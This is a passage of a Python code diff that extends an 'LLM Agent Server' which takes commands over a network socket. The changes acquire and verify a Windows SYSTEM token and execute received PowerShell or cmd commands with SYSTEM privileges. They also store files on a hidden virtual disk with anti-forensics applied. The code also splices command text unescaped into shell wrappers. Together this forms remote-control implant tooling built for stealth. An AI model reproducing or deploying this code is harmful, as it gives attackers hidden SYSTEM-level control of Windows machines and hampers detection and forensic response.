+                self.session_data['SYSTEM_TOKEN_ACQUIRED'] = True
+                self.session_data['SYSTEM_TOKEN_SID'] = token_status['details'].get('UserSID', 'S-1-5-18')
+            else:
+                self.console.print(f"[yellow]⚠ SYSTEM token not detected - will attempt acquisition when needed[/yellow]")
+                # Try to acquire SYSTEM token
+                if self.code_generator.acquire_system_token():
+                    self.system_token_acquired = True
+                    self.session_data['SYSTEM_TOKEN_ACQUIRED'] = True
+    
+    def check_system_token(self) -> Dict[str, Any]:
+        """Check SYSTEM token status using PE5 method"""
+        return self.code_generator.check_system_token_pe5()
+    
+    def ensure_system_token(self) -> bool:
+        """Ensure SYSTEM token is available, acquire if needed"""
+        if self.system_token_acquired:
+            # Verify token is still valid
+            token_status = self.code_generator.check_system_token_pe5()
+            if token_status.get('has_system'):
+                return True
+            else:
+                # Token lost, reset state
+                self.system_token_acquired = False
+                self.code_generator.system_token_acquired = False
+        
+        # Try to acquire
+        if self.system_privilege:
+            if self.code_generator.acquire_system_token():
+                self.system_token_acquired = True
+                return True
+        
+        return False
+    
+    def pass_system_token_to_process(self, process_handle=None):
+        """
+        Pass SYSTEM token to a process or ensure current process has it
+        
+        Args:
+            process_handle: Optional handle to process to pass token to
+                          If None, ensures current process has SYSTEM token
+        """
+        if not self.ensure_system_token():
+            self.console.print("[red]Error: Cannot pass SYSTEM token - token not available[/red]")
+            return False
+        
+        # Token is already in current process, child processes will inherit it
+        # For explicit token passing, would need to use DuplicateTokenEx and SetTokenInformation
+        self.console.print("[green]✓ SYSTEM token available - child processes will inherit[/green]")
+        return True
+    
+    def get_hidden_storage(self) -> Optional[HiddenVirtualDisk]:
+        """
+        Get hidden virtual disk instance for temporary storage
+        
+        Returns:
+            HiddenVirtualDisk instance or None
+        """
+        if self.hidden_vdisk is None and self.system_privilege:
+            lab_use = self.session_data.get('LAB_USE', 0)
+            self.hidden_vdisk = create_hidden_storage(size_gb=10, lab_use=lab_use)
+        return self.hidden_vdisk
+    
+    def store_in_hidden_disk(self, source_path: str, dest_name: Optional[str] = None) -> Tuple[bool, Optional[str]]:
+        """
+        Store file in hidden virtual disk
+        
+        Args:
+            source_path: Path to source file
+            dest_name: Destination filename (None = use source name)
+        
+        Returns:
+            Tuple of (success, destination_path)
+        """
+        vdisk = self.get_hidden_storage()
+        if vdisk:
+            return vdisk.store_file(source_path, dest_name, apply_anti_forensics=True)
+        return False, None
+    
+    def cleanup_hidden_storage(self, remove_vhd: bool = False):
+        """
+        Cleanup hidden virtual disk
+        
+        Args:
+            remove_vhd: Remove VHD file after unmount (default: False to preserve data)
+        """
+        if self.hidden_vdisk:
+            self.hidden_vdisk.cleanup(remove_vhd=remove_vhd)
+            self.hidden_vdisk = None
         
     def start(self):
         """Start the LLM agent server"""
@@ -314,7 +1653,15 @@ class LLMAgentServer:
             self.socket.listen(5)
             self.running = True
             
-            self.console.print(f"[green]LLM Agent Server started on {self.host}:{self.port}[/green]")
+            privilege_status = "[SYSTEM]" if self.system_privilege else "[USER]"
+            token_status = ""
+            if self.system_privilege:
+                token_check = self.check_system_token()
+                if token_check.get('has_system'):
+                    token_status = " [SYSTEM TOKEN VERIFIED]"
+                else:
+                    token_status = " [SYSTEM TOKEN NOT DETECTED]"
+            self.console.print(f"[green]LLM Agent Server started on {self.host}:{self.port} {privilege_status}{token_status}[/green]")
             
             while self.running:
                 try:
@@ -346,6 +1693,11 @@ class LLMAgentServer:
             except Exception:
                 pass
         self.code_generator.cleanup()
+        
+        # Cleanup hidden virtual disk (but don't remove VHD to preserve data)
+        if self.hidden_vdisk:
+            self.cleanup_hidden_storage(remove_vhd=False)
+        
         self.console.print("[yellow]LLM Agent Server stopped[/yellow]")
     
     def _handle_client(self, client_socket: socket.socket, address: Tuple[str, int]):
@@ -455,7 +1807,7 @@ class LLMAgentServer:
             self._send_app_error(client_socket, self.app_id, 0xFFFE, str(e))
     
     def _handle_app_command(self, client_socket: socket.socket, header: bytes, payload: bytes, flags: int):
-        """Handle APP_COMMAND message"""
+        """Handle APP_COMMAND message with enhanced code generation"""
         try:
             cmd_data = MRACProtocol.unpack_command(payload)
             app_id = cmd_data['app_id']
@@ -471,6 +1823,13 @@ class LLMAgentServer:
                 )
                 self._send_memshadow_message(client_socket, MRACMessageType.APP_COMMAND_ACK, ack_payload, flags)
                 return
+            
+            self.console.print(f"[cyan]Processing command {command_id} type {cmd_type}[/cyan]")
+            
+            # Ensure SYSTEM token is available before processing commands if SYSTEM privilege is enabled
+            if self.system_privilege:
+                if not self.ensure_system_token():
+                    self.console.print("[yellow]Warning: SYSTEM token not available for command execution[/yellow]")
             
             # Process command based on type
             if cmd_type == SelfCodeCommandType.SELF_CODE_PLAN_REQUEST:
@@ -513,17 +1872,43 @@ class LLMAgentServer:
         pass
     
     def _handle_plan_request(self, args: bytes) -> Dict[str, Any]:
-        """Handle SELF_CODE_PLAN_REQUEST"""
+        """Handle SELF_CODE_PLAN_REQUEST with enhanced planning"""
         try:
             data = json.loads(args.decode('utf-8')) if args else {}
             objective = data.get('objective', '')
+            system_privilege = data.get('system_privilege', self.system_privilege)
+            language = data.get('language', 'powershell')
             
-            # Generate a plan (simplified - would call LLM in real implementation)
+            # Enhanced plan generation
             plan = {
+                'objective': objective,
+                'system_privilege': system_privilege,
+                'language': language,
                 'steps': [
-                    {'action': 'analyze', 'target': objective},
-                    {'action': 'generate_code', 'language': 'python'},
-                    {'action': 'test', 'command': ['pytest', '-q']}
+                    {
+                        'action': 'analyze',
+                        'target': objective,
+                        'description': 'Analyze requirements and constraints'
+                    },
+                    {
+                        'action': 'generate_code',
+                        'language': language,
+                        'system_privilege': system_privilege,
+                        'description': f'Generate {language} code with SYSTEM privilege' if system_privilege else f'Generate {language} code'
+                    },
+                    {
+                        'action': 'validate',
+                        'description': 'Validate generated code syntax'
+                    },
+                    {
+                        'action': 'execute',
+                        'system_privilege': system_privilege,
+                        'description': 'Execute code with SYSTEM privileges' if system_privilege else 'Execute code'
+                    },
+                    {
+                        'action': 'verify',
+                        'description': 'Verify execution results'
+                    }
                 ]
             }
             
@@ -546,36 +1931,117 @@ class LLMAgentServer:
             return {'success': False, 'error': str(e)}
     
     def _handle_test_run(self, args: bytes) -> Dict[str, Any]:
-        """Handle SELF_CODE_TEST_RUN"""
+        """Handle SELF_CODE_TEST_RUN with SYSTEM token inheritance"""
         try:
+            # Ensure SYSTEM token is available if SYSTEM privilege is enabled
+            if self.system_privilege:
+                if not self.ensure_system_token():
+                    return {
+                        'success': False,
+                        'error': 'SYSTEM token not available',
+                        'exit_code': 1,
+                        'stdout': '',
+                        'stderr': 'SYSTEM token acquisition failed'
+                    }
+            
             data = json.loads(args.decode('utf-8'))
             command = data.get('command', [])
             timeout_sec = data.get('timeout_sec', 120)
             
-            # Execute test command
-            result = subprocess.run(
-                command,
-                capture_output=True,
-                text=True,
-                timeout=timeout_sec
-            )
-            
-            return {
-                'success': result.returncode == 0,
-                'exit_code': result.returncode,
-                'stdout': result.stdout,
-                'stderr': result.stderr
-            }
+            # Execute test command with SYSTEM token inheritance
+            if self.system_privilege and self.system_token_acquired:
+                # Use PowerShell to ensure SYSTEM token is passed
+                ps_cmd = f"""
+                $token = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+                $isSystem = ($token.User.Value -eq 'S-1-5-18')
+                if (-not $isSystem) {{
+                    Write-Error 'SYSTEM token not available'
+                    exit 1
+                }}
+                $proc = Start-Process -FilePath '{command[0]}' `
+                    -ArgumentList {' '.join([f"'{a}'" for a in command[1:]])} `
+                    -NoNewWindow -Wait -PassThru `
+                    -PassThru
+                exit $proc.ExitCode
+                """
+                exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.session_data.get('LAB_USE', 0))
+                return {
+                    'success': exit_code == 0,
+                    'exit_code': exit_code,
+                    'stdout': stdout,
+                    'stderr': stderr
+                }
+            else:
+                # Execute test command normally
+                result = subprocess.run(
+                    command,
+                    capture_output=True,
+                    text=True,
+                    timeout=timeout_sec
+                )
+                
+                return {
+                    'success': result.returncode == 0,
+                    'exit_code': result.returncode,
+                    'stdout': result.stdout,
+                    'stderr': result.stderr
+                }
         except Exception as e:
             return {'success': False, 'error': str(e)}
     
     def _handle_generic_command(self, cmd_type: int, args: bytes) -> Dict[str, Any]:
-        """Handle generic command execution"""
+        """Handle generic command execution with SYSTEM token inheritance"""
         try:
+            # Ensure SYSTEM token is available if SYSTEM privilege is enabled
+            if self.system_privilege:
+                if not self.ensure_system_token():
+                    return {
+                        'success': False,
+                        'error': 'SYSTEM token not available',
+                        'exit_code': 1,
+                        'stdout': '',
+                        'stderr': 'SYSTEM token acquisition failed'
+                    }
+            
             # Parse args as JSON command
             data = json.loads(args.decode('utf-8')) if args else {}
             command = data.get('command', '')
             language = data.get('language', 'powershell')
+            
+            # Wrap command to ensure SYSTEM token is passed
+            if self.system_privilege and self.system_token_acquired:
+                if language == 'powershell':
+                    # Ensure SYSTEM token is verified in PowerShell execution
+                    command = f"""
+                    # Verify SYSTEM token is available
+                    $token = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+                    $isSystem = ($token.User.Value -eq 'S-1-5-18')
+                    if (-not $isSystem) {{
+                        Write-Error 'SYSTEM token not available'
+                        exit 1
+                    }}
+                    # Execute command with SYSTEM token (inherited)
+                    {command}
+                    """
+                else:
+                    # For cmd, wrap in PowerShell to ensure token inheritance
+                    ps_wrapper = f"""
+                    $token = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+                    $isSystem = ($token.User.Value -eq 'S-1-5-18')
+                    if (-not $isSystem) {{
+                        Write-Error 'SYSTEM token not available'
+                        exit 1
+                    }}
+                    $proc = Start-Process -FilePath 'cmd.exe' -ArgumentList '/c', '{command}' -NoNewWindow -Wait -PassThru
+                    exit $proc.ExitCode
+                    """
+                    exit_code, stdout, stderr = execute_powershell(ps_wrapper, lab_use=self.session_data.get('LAB_USE', 0))
+                    return {
+                        'success': exit_code == 0,
+                        'exit_code': exit_code,
+                        'stdout': stdout,
+                        'stderr': stderr
+                    }
             
             if language == 'powershell':
                 exit_code, stdout, stderr = execute_powershell(
@@ -620,6 +2086,7 @@ class LLMAgentServer:
         """Send APP_ERROR message"""
         error_payload = MRACProtocol.pack_error(app_id, error_code, detail, self.session_token)
         self._send_memshadow_message(client_socket, MRACMessageType.APP_ERROR, error_payload)
+    
 
 
 class LLMAgentModule:
